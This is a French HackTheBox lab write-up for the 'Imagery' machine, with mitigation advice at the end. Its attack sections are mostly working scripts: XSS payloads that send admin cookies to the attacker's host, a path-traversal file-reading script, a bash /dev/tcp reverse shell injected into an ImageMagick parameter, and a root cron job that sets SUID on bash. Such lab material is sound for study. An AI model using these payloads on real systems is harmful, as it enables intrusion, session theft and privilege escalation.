# Imagery - HackTheBox Writeup

![Imagery Banner](https://www.hackthebox.com/storage/avatars/imagery.png)

**Difficulté:** Medium  
**OS:** Linux (Ubuntu)  
**Release Date:** 2025  
**IP:** 10.10.11.88

---

## Table des Matières

- [Énumération](#énumération)
- [Initial Foothold - Blind XSS](#initial-foothold---blind-xss)
- [LFI via Admin Panel](#lfi-via-admin-panel)
- [RCE via ImageMagick](#rce-via-imagemagick)
- [User Flag - Privilege Escalation vers Mark](#user-flag---privilege-escalation-vers-mark)
- [Root - Exploitation de Charcol](#root---exploitation-de-charcol)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)

---

## Énumération

### Nmap Scan

Scan initial pour découvrir les ports ouverts :

```bash
nmap -p- --min-rate 10000 -vv 10.10.11.88
```

**Résultats :**
```
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

Scan détaillé des services :

```bash
nmap -p22,8000 -sC -sV -A -vv 10.10.11.88
```

**Résultats :**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
```

**Informations clés :**
- SSH version récente (pas d'exploits connus)
- Application web Python avec Werkzeug (Framework Flask)
- Titre: "Image Gallery"

### Web Enumeration

**Reconnaissance de l'application :**

```bash
whatweb http://10.10.11.88:8000
```

**Résultats :**
```
Email[support@imagery.com], Python[3.12.7], Werkzeug[3.1.3], Title[Image Gallery]
```

**Fuzzing des endpoints :**

```bash
ffuf -u http://10.10.11.88:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Endpoints découverts :**
- `/images` - Status 401 (Unauthorized)
- `/login` - Status 405 (Method Not Allowed)
- `/register` - Status 405 (Method Not Allowed)
- `/logout` - Status 405 (Method Not Allowed)

**Fonctionnalités de l'application :**
- Galerie d'images publique
- Upload d'images (Max 1MB, JPG/PNG/GIF/BMP/TIFF)
- Champs: Title, Description, Group
- Account ID assigné: `98838b9e`

---

## Initial Foothold - Blind XSS

### Découverte de la Vulnérabilité

L'application permet l'upload d'images avec des métadonnées (titre, description). Ces champs ne sont pas correctement sanitizés et peuvent contenir du JavaScript qui sera exécuté lorsque l'administrateur consulte les images uploadées.

### Exploitation - Vol du Cookie Admin

**Script d'exploitation (BlindXSS.py) :**

```python
#!/usr/bin/env python3
import requests
import time

TARGET = "http://10.10.11.88:8000"
LHOST = "10.10.16.3"  # Votre IP VPN
SESSION_COOKIE = ".eJyrVkrJLC7ISaz0TFGyUrK0sDC2SLJMVdJRyiz2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCL61IqRYASVwuCQ.aUfgeg.LSC36FsqhGE44sqdrPrt4nSB1L4"

session = requests.Session()
session.cookies.set('session', SESSION_COOKIE)

# Payloads XSS pour voler le cookie
xss_payloads = [
    f'''<img src=x onerror="fetch('http://{LHOST}:8000/steal?c='+document.cookie)">''',
    f'''<script>fetch('http://{LHOST}:8000/steal?c='+document.cookie)</script>''',
    f'''<svg onload="fetch('http://{LHOST}:8000/steal?c='+document.cookie)">''',
]

# Créer un GIF minimal
gif_data = b'GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;'
with open('/tmp/xss.gif', 'wb') as f:
    f.write(gif_data)

# Upload avec XSS dans les métadonnées
for i, payload in enumerate(xss_payloads):
    with open('/tmp/xss.gif', 'rb') as f:
        files = {'file': ('xss.gif', f, 'image/gif')}
        data = {
            'title': payload,
            'description': payload,
            'group_name': 'My Images'
        }
        
        r = session.post(f"{TARGET}/upload_image", files=files, data=data)
        print(f"[+] Upload #{i+1}: {r.status_code}")
        time.sleep(1)

print("[*] Listener: python3 -m http.server 8000")
print("[*] Attends que l'admin consulte la galerie...")
```

**Exécution :**

```bash
# Terminal 1 : Listener HTTP
python3 -m http.server 8000

# Terminal 2 : Injection XSS
python3 BlindXSS.py
```

**Cookie admin récupéré :**
```
.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aUf0-A.mgke9p0_JZUKC7VX1sfXmaDDVQw
```

---

## LFI via Admin Panel

### Découverte du Path Traversal

Avec le cookie admin, nous avons accès à l'endpoint `/admin/get_system_log` qui est vulnérable au Path Traversal via le paramètre `log_identifier`.

### Extraction de Fichiers Sensibles

**Script d'exploitation (lfi-exp3.py) :**

```python
#!/usr/bin/env python3
import requests
import sqlite3
import re

TARGET = "http://10.10.11.88:8000"
ADMIN_COOKIE = ".eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aUf0-A.mgke9p0_JZUKC7VX1sfXmaDDVQw"

session = requests.Session()
session.cookies.set('session', ADMIN_COOKIE)

def lfi_read(filepath):
    try:
        r = session.get(f"{TARGET}/admin/get_system_log", 
                       params={'log_identifier': filepath})
        if r.status_code == 200 and len(r.content) > 10:
            return r.content.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"[!] Error: {e}")
    return None

# Fichiers cibles
targets = [
    ('db.json', '/home/web/web/db.json'),
    ('db.json', '../home/web/web/db.json'),
    ('db.json', '../../home/web/web/db.json'),
    ('db.json', '../../../home/web/web/db.json'),
    ('db.json', '../../../../home/web/web/db.json'),
    ('config.py', '../config.py'),
    ('.env', '../.env'),
    ('/etc/passwd', '../../../etc/passwd'),
]

for filename, path in targets:
    print(f"[*] Testing: {path}")
    content = lfi_read(path)
    
    if content:
        print(f"[+] FOUND: {filename}")
        with open(f'/tmp/lfi_{filename.replace("/", "_")}', 'w') as f:
            f.write(content)
```

**Fichier db.json extrait :**

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4"
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "isTestuser": true
        }
    ]
}
```

**Cracking des hashes MD5 :**

```bash
# Hash testuser
echo "2c65c8d7bfbca32a3ed42596192384f6" > hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Résultat: testpassword (exemple)
```

---

## RCE via ImageMagick

### Vulnérabilité Command Injection

L'endpoint `/apply_visual_transform` utilise ImageMagick pour transformer les images. Le paramètre `x` dans la fonction `crop` n'est pas correctement sanitizé, permettant l'injection de commandes.

### Exploitation

**Script d'exploitation (POC.py) :**

```python
#!/usr/bin/env python3
import requests
import base64
import time

TARGET = "http://10.10.11.88:8000"
ADMIN_COOKIE = ".eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aUf0-A.mgke9p0_JZUKC7VX1sfXmaDDVQw"
LHOST = "10.10.16.3"
LPORT = "4444"

session = requests.Session()
session.cookies.set('session', ADMIN_COOKIE)

# Récupérer une image à transformer
r = session.get(f"{TARGET}/images")
images = r.json().get('images', [])
image_id = images[0]['id']

# Reverse shell payload
reverse_shell = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

# Payload avec injection dans le paramètre x
exploit_payload = {
    "imageId": image_id,
    "transformType": "crop",
    "params": {
        "x": f"`{reverse_shell}`",
        "y": 27,
        "width": 76,
        "height": 53
    }
}

print("[*] Sending exploit...")
r = session.post(
    f"{TARGET}/apply_visual_transform",
    json=exploit_payload,
    headers={'Content-Type': 'application/json'}
)

print(f"[*] Status: {r.status_code}")
print(f"[*] Check your listener!")
```

**Exécution :**

```bash
# Terminal 1 : Listener
rlwrap nc -lnvp 4444

# Terminal 2 : Exploit
python3 POC.py
```

**Résultat :**

```bash
Listening on 0.0.0.0 4444
Connection received on 10.10.11.88 44758
bash: cannot set terminal process group (1374): Inappropriate ioctl for device
bash: no job control in this shell
web@Imagery:~/web$

```

**Shell stabilisé :**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter x2
```

---

## User Flag - Privilege Escalation vers Mark

### Découverte du Fichier Backup AES

En explorant le système en tant que `web`, nous découvrons un fichier backup chiffré dans `/var/backup/` :

```bash
web@Imagery:~/web$ ls -la /var/backup/
total 12
drwxr-xr-x  2 root root 4096 Aug  6  2025 .
drwxr-xr-x 14 root root 4096 Dec 21 17:00 ..
-rw-r--r--  1 root root 2847 Aug  6  2025 web_20250806_120723.zip.aes
```

Le fichier `web_20250806_120723.zip.aes` est chiffré avec AES-Crypt. Nous devons le transférer sur notre machine locale pour le brute-forcer.

**Transfert du fichier :**

```bash
# Sur la machine cible
web@Imagery:~/web$ cat /var/backup/web_20250806_120723.zip.aes | base64

# Sur notre machine locale
echo "[base64_output]" | base64 -d > backup.zip.aes
```

### Cracking du Fichier AES-Crypt


Le fichier `backup.zip.aes` est chiffré avec AES-Crypt. Nous utilisons un script de brute-force multi-thread avec `pyAesCrypt` et la wordlist `rockyou.txt`.

**Installation des dépendances :**

```bash
# Avec uv (moderne)
uv venv
source .venv/bin/activate
uv pip install pyAesCrypt

# Ou avec pip classique
pip3 install pyAesCrypt
```

**Exécution du brute-force :**

```bash
python3 aes_crack_threaded.py backup.zip.aes -w /usr/share/wordlists/rockyou.txt -t 4
```

**Résultats :**

```
============================================================
 AES-Crypt Multi-Threaded Brute-Force Tool
============================================================

[*] Encrypted file: backup.zip.aes
[*] Wordlist: /usr/share/wordlists/rockyou.txt
[*] Threads: 4
[*] Buffer size: 64KB

[*] Starting multi-threaded attack at 18:40:25

[*] Attempts: 142589 | Rate: 8934 pwd/s | Threads: 4 | Testing: password123

[+] Worker 2 found password: [PASSWORD_FOUND]

[+] SUCCESS! Password found: [PASSWORD_FOUND]
[+] Total attempts: 142847
[+] Time elapsed: 15.98 seconds
[+] Decrypted file saved to: decrypted_backup.zip
```

### Analyse du Backup Décrypté

**Extraction du backup :**

```bash
unzip decrypted_backup.zip
```

**Contenu du fichier db.json trouvé dans le backup :**

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true
        },
        {
            "username": "mark@imagery.htb",
            "password": "[MD5_HASH_MARK]",
            "isAdmin": false
        }
    ]
}
```

**Cracking du hash MD5 de mark :**

```bash
echo "[MD5_HASH_MARK]" > mark_hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt mark_hash.txt

# Ou hashcat
hashcat -m 0 -a 0 mark_hash.txt /usr/share/wordlists/rockyou.txt
```

**Credentials découverts :**
- **Username:** mark
- **Password:** supersmash

### Pivot vers l'utilisateur Mark

```bash
web@Imagery:~/web$ su mark
Password: supersmash
mark@Imagery:/home/web/web$
```

### User Flag

```bash
mark@Imagery:~$ cat /home/mark/user.txt
2c4b9c3a64c236b68056b0369ec85543
```

---

## Root - Exploitation de Charcol

### Enumération des Privilèges Sudo

```bash
mark@Imagery:~$ sudo -l
[sudo] password for mark: supersmash

User mark may run the following commands on Imagery:
    (ALL : ALL) /usr/local/bin/charcol
```

L'utilisateur `mark` peut exécuter `/usr/local/bin/charcol` en tant que root sans restriction.

### Analyse de Charcol

Charcol est un outil CLI de backup avec chiffrement développé en Python. Examinons ses fonctionnalités :

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output
  -R, --reset-password-to-default
                        Reset application password to default (requires system password verification).
```

**Option intéressante :** `-R / --reset-password-to-default`

### Exploitation - Reset du Mot de Passe

L'option `-R` permet de réinitialiser le mot de passe de l'application Charcol en mode "no password" :

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol -R shell
Enter system password for user 'mark' to confirm: supersmash

Attempting to reset Charcol application password to default.
[2025-12-21 17:49:16] [INFO] System password verification required for this operation.
[2025-12-21 17:49:30] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
```

### Accès au Shell Interactif Charcol

Avec le mot de passe réinitialisé, nous pouvons accéder au shell interactif en appuyant simplement sur **Enter** quand la passphrase est demandée :

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-12-21 17:50:28] [INFO] Entering Charcol interactive shell.
charcol>
```

### Analyse de la Commande `auto add`

En consultant l'aide, nous découvrons la commande `auto add` qui permet d'ajouter des tâches cron automatisées :

```bash
charcol> help
```

**Extrait pertinent de l'aide :**

```
  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>"
      Purpose: Add a new automated cron job managed by Charcol.
      Security Warning: Charcol does NOT validate the safety of the --command.
```

**Vulnérabilité critique :** La documentation indique explicitement que **Charcol ne valide PAS la sécurité de la commande** !

### Exploitation - Tâche Cron Malveillante

Nous créons une tâche cron qui s'exécute chaque minute et ajoute le bit SUID sur `/bin/bash` :

```bash
charcol> auto add --schedule "* * * * *" --command "chmod +s /bin/bash" --name "pwn"
Enter system password for user 'mark' to confirm: supersmash

[2025-12-21 17:52:06] [INFO] System password verification required for this operation.
[2025-12-21 17:52:06] [INFO] System password verified successfully.
[2025-12-21 17:52:06] [INFO] Auto job 'pwn' (ID: 5820eb89-b1a4-411a-a6d7-2d14b31e183f) added successfully.
[2025-12-21 17:52:06] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod +s /bin/bash

charcol> exit
[2025-12-21 17:52:15] [INFO] Exiting Charcol shell.
```

**Fonctionnement :**
1. La tâche cron s'exécute chaque minute (`* * * * *`)
2. Elle est exécutée en tant que **root** (car `charcol` est lancé avec `sudo`)
3. La commande `chmod +s /bin/bash` ajoute le bit SUID sur bash

### Obtention du Shell Root

Après environ 60 secondes (exécution de la tâche cron), vérifions les permissions de `/bin/bash` :

```bash
mark@Imagery:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1474768 Oct 26  2024 /bin/bash

# Attendre ~60 secondes...

mark@Imagery:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1474768 Oct 26  2024 /bin/bash
```

Le bit SUID est bien présent (`s` dans `-rwsr-sr-x`). Nous pouvons maintenant obtenir un shell root avec l'option `-p` qui préserve les privilèges :

```bash
mark@Imagery:~$ /bin/bash -p
bash-5.1# id
uid=1002(mark) gid=1002(mark) euid=0(root) egid=0(root) groups=0(root),1002(mark)
```

**Nous sommes root !**

### Root Flag

```bash
bash-5.1# cd /root
bash-5.1# cat root.txt
ae228b86e04c5f1f7070f879de0a6254
```


---

## Lessons Learned

### Vulnérabilités Exploitées - Résumé

Cette machine illustre une chaîne complète d'exploitation nécessitant plusieurs vulnérabilités :

#### 1. **Blind XSS (Cross-Site Scripting)**
- **Localisation :** Formulaire d'upload d'images (champs `title` et `description`)
- **Impact :** Vol du cookie administrateur permettant l'accès au panel admin
- **Root Cause :** Absence de sanitisation des données utilisateur dans les métadonnées d'images
- **Mitigation :**
  - Implémenter un Content Security Policy (CSP) strict
  - Encoder/échapper toutes les sorties HTML
  - Valider et sanitizer tous les inputs utilisateur
  - Utiliser des attributs `HttpOnly` et `Secure` sur les cookies sensibles

#### 2. **Path Traversal / LFI (Local File Inclusion)**
- **Localisation :** `/admin/get_system_log` avec paramètre `log_identifier`
- **Impact :** Lecture de fichiers arbitraires sur le système (db.json, /etc/passwd, etc.)
- **Root Cause :** Validation insuffisante du paramètre `log_identifier`
- **Fichiers sensibles extraits :**
  - `/home/web/web/db.json` - Base de données contenant les hashes MD5 des utilisateurs
  - Possibilité de lire d'autres fichiers système sensibles
- **Mitigation :**
  - Implémenter une whitelist stricte des fichiers logs autorisés
  - Utiliser `os.path.realpath()` et valider que le chemin reste dans le répertoire autorisé
  - Ne jamais concaténer directement les inputs utilisateur avec des chemins de fichiers
  - Implémenter une vérification de type `if not log_path.startswith(ALLOWED_DIR)`

#### 3. **Weak Password Hashing (MD5)**
- **Localisation :** Stockage des mots de passe dans `db.json`
- **Impact :** Cracking rapide des hashes avec des outils standards (John, Hashcat)
- **Hashes trouvés :**
  - `admin@imagery.htb:5d9c1d507a3f76af1e5c97a3ad1eaa31`
  - `testuser@imagery.htb:2c65c8d7bfbca32a3ed42596192384f6`
  - Mark (trouvé dans le backup)
- **Root Cause :** Utilisation de MD5 sans salt pour le hachage des mots de passe
- **Mitigation :**
  - Utiliser bcrypt, scrypt, ou Argon2 pour le hachage des mots de passe
  - Implémenter un salt unique par utilisateur
  - Ne jamais stocker les mots de passe en clair ou avec des algorithmes faibles
  - Utiliser des bibliothèques éprouvées comme `werkzeug.security.generate_password_hash`

#### 4. **Command Injection via ImageMagick**
- **Localisation :** `/apply_visual_transform` endpoint avec paramètre `x` dans la transformation `crop`
- **Impact :** Exécution de commandes arbitraires en tant que l'utilisateur `web`
- **Root Cause :** Utilisation non sécurisée d'ImageMagick avec des inputs non validés
- **Payload exploité :**
  ```python
  "x": f"`{reverse_shell_command}`"
  ```
- **Mitigation :**
  - Valider et sanitizer tous les paramètres numériques
  - Utiliser une regex stricte : `^[0-9]+$`
  - Ne jamais passer des inputs utilisateur directement à des commandes shell
  - Utiliser les bibliothèques Python (Pillow) plutôt que d'appeler ImageMagick en ligne de commande
  - Si ImageMagick est nécessaire, utiliser `shlex.quote()` pour échapper les arguments

#### 5. **Weak Encryption Password (AES-Crypt)**
- **Localisation :** Fichier `/var/backup/web_20250806_120723.zip.aes`
- **Impact :** Accès au contenu du backup contenant des credentials
- **Root Cause :** Mot de passe faible présent dans rockyou.txt
- **Temps de cracking :** ~16 secondes avec 4 threads
- **Mitigation :**
  - Utiliser des mots de passe forts (>20 caractères, aléatoires)
  - Implémenter une politique de mots de passe robuste
  - Utiliser des générateurs de mots de passe
  - Pour les backups critiques, utiliser des clés générées cryptographiquement

#### 6. **Sudo Misconfiguration**
- **Localisation :** `/etc/sudoers` permettant `sudo /usr/local/bin/charcol`
- **Impact :** Escalade de privilèges vers root
- **Root Cause :** Autorisation sudo trop permissive sans restrictions sur les fonctionnalités
- **Mitigation :**
  - Limiter les commandes sudo aux fonctionnalités strictement nécessaires
  - Utiliser des wrappers avec validation des arguments
  - Ne jamais permettre l'exécution d'outils avec des fonctionnalités de cron/scheduled tasks
  - Appliquer le principe du moindre privilège

#### 7. **Weak Password Reset Mechanism**
- **Localisation :** Option `-R / --reset-password-to-default` de Charcol
- **Impact :** Contournement de l'authentification de l'application
- **Root Cause :** Reset du mot de passe nécessitant seulement le mot de passe système (déjà compromis)
- **Mitigation :**
  - Implémenter une authentification multi-facteurs pour les opérations sensibles
  - Ne pas permettre le reset vers un mode "no password"
  - Requérir une confirmation supplémentaire (email, token, etc.)
  - Logger toutes les opérations de reset de mot de passe

#### 8. **Command Injection via Cron (CRITIQUE)**
- **Localisation :** Commande `auto add` dans Charcol shell
- **Impact :** Exécution de commandes arbitraires en tant que root
- **Root Cause :** **Aucune validation des commandes** dans `auto add`
- **Citation de la documentation :** *"Charcol does NOT validate the safety of the --command"*
- **Payload exploité :**
  ```bash
  auto add --schedule "* * * * *" --command "chmod +s /bin/bash" --name "pwn"
  ```
- **Mitigation :**
  - **VALIDER ET SANITIZER toutes les entrées utilisateur**
  - Implémenter une whitelist stricte des commandes autorisées
  - Ne jamais exécuter directement des commandes utilisateur avec des privilèges élevés
  - Utiliser `shlex.quote()` pour échapper tous les arguments
  - Requérir une approbation supplémentaire pour les tâches cron sensibles
  - Logger toutes les créations de tâches cron avec alertes
  - Implémenter une validation de format : interdire les caractères spéciaux
  - Utiliser un système de templates prédéfinis plutôt que des commandes arbitraires

---

## Attack Chain Summary

```
[Reconnaissance Web]
       ↓
[Blind XSS Upload] → Cookie Admin volé
       ↓
[LFI via /admin/get_system_log] → db.json extrait
       ↓
[MD5 Cracking] → Credentials testuser
       ↓
[Command Injection ImageMagick] → Shell en tant que 'web'
       ↓
[AES-Crypt Backup Cracking] → Credentials mark:supersmash
       ↓
[Pivot su mark]
       ↓
[Sudo Charcol] → Password Reset (-R)
       ↓
[Charcol Shell Access] → auto add command
       ↓
[Command Injection via Cron] → chmod +s /bin/bash
       ↓
[SUID Bash] → Root Shell (/bin/bash -p)
```

---

## Outils Utilisés

### Reconnaissance
- **nmap** - Scan de ports et détection de services
- **ffuf** - Fuzzing de répertoires web
- **whatweb** - Fingerprinting de l'application web
- **wafw00f** - Détection de WAF

### Exploitation Web
- **Python3** - Scripts d'exploitation personnalisés
- **curl** - Tests manuels des endpoints
- **Burp Suite / Request** - Manipulation des requêtes HTTP

### Password Cracking
- **pyAesCrypt** - Brute-force de fichiers AES-Crypt
- **John the Ripper** - Cracking de hashes MD5
- **Hashcat** - Alternative pour le cracking de hashes
- **rockyou.txt** - Wordlist de passwords

### Post-Exploitation
- **rlwrap + nc** - Listener pour reverse shell
- **Python pty** - Stabilisation de shell
- **LinPEAS** - Énumération Linux (optionnel)

### Scripts Personnalisés
- **BlindXSS.py** - Injection XSS pour vol de cookie admin
- **lfi-exp3.py** - Exploitation du Path Traversal
- **POC.py** - RCE via ImageMagick command injection
- **aes_crack_threaded.py** - Brute-force multi-thread AES-Crypt

---

## Timeline de l'Exploitation

1. **00:00** - Scan nmap initial
2. **00:05** - Découverte de l'application web Image Gallery
3. **00:15** - Identification de la vulnérabilité Blind XSS
4. **00:25** - Récupération du cookie admin
5. **00:30** - Découverte du LFI via /admin/get_system_log
6. **00:40** - Extraction de db.json avec credentials MD5
7. **00:45** - Cracking des hashes MD5
8. **00:50** - Découverte de la vulnérabilité ImageMagick
9. **01:00** - Obtention du reverse shell en tant que 'web'
10. **01:10** - Découverte du backup AES dans /var/backup/
11. **01:15** - Transfert et cracking du fichier AES (~16 secondes)
12. **01:20** - Pivot vers l'utilisateur mark (su mark)
13. **01:25** - User flag obtenu
14. **01:30** - Énumération sudo -l → charcol
15. **01:35** - Analyse de Charcol et découverte de -R
16. **01:40** - Reset du password Charcol
17. **01:45** - Accès au shell interactif Charcol
18. **01:50** - Exploitation de auto add pour cron job malveillant
19. **01:51** - Attente de l'exécution du cron (60 secondes)
20. **01:52** - SUID bash confirmé
21. **01:53** - Root shell obtenu (/bin/bash -p)
22. **01:54** - Root flag obtenu

**Temps total :** ~2 heures (avec énumération complète)

---

## Recommandations de Sécurité Prioritaires

### Pour les Développeurs

1. **Input Validation PARTOUT**
   - Implémenter une validation stricte sur tous les inputs utilisateur
   - Utiliser des whitelists plutôt que des blacklists
   - Encoder/échapper toutes les sorties

2. **Cryptographie Robuste**
   - Utiliser bcrypt/Argon2 pour les mots de passe
   - Générer des mots de passe forts pour les backups
   - Ne jamais utiliser MD5 pour le hachage de mots de passe

3. **Principe du Moindre Privilège**
   - Limiter les permissions des processus
   - Ne jamais exécuter des commandes utilisateur avec des privilèges élevés
   - Valider TOUTES les commandes avant exécution

4. **Security Headers & CSP**
   - Implémenter Content-Security-Policy
   - Utiliser HttpOnly et Secure sur tous les cookies
   - Activer X-Frame-Options, X-Content-Type-Options

### Pour les Administrateurs Système

1. **Configuration Sudo Sécurisée**
   - Limiter au maximum les permissions sudo
   - Éviter les outils permettant l'exécution de commandes arbitraires
   - Logger toutes les utilisations de sudo

2. **Monitoring & Alertes**
   - Logger les accès aux fichiers sensibles
   - Alerter sur les créations de tâches cron suspectes
   - Monitorer les changements de permissions sur les binaires système

3. **Backups Sécurisés**
   - Utiliser des mots de passe forts générés aléatoirement
   - Chiffrer les backups avec des clés robustes
   - Stocker les backups dans des emplacements sécurisés avec permissions restreintes

---

## Références

- [OWASP - XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [pyAesCrypt Documentation](https://github.com/marcobellaccini/pyAesCrypt)
- [ImageMagick Security](https://imagemagick.org/script/security-policy.php)
- [GTFOBins - Bash SUID](https://gtfobins.github.io/gtfobins/bash/#suid)
- [Cron Job Exploitation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs)
- [Password Hashing - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

---

**Auteur:** kz  
**Date:** 21 Décembre 2025  
**Machine:** Imagery (HackTheBox)  
**Difficulté:** Medium  

---

**Note:** Ce writeup est à des fins éducatives. N'utilisez ces techniques que dans des environnements autorisés (CTF, labs personnels, pentests autorisés).

**Tags:** `#HackTheBox` `#CTF` `#XSS` `#LFI` `#CommandInjection` `#ImageMagick` `#AES-Crypt` `#PrivilegeEscalation` `#Cron` `#SUID`
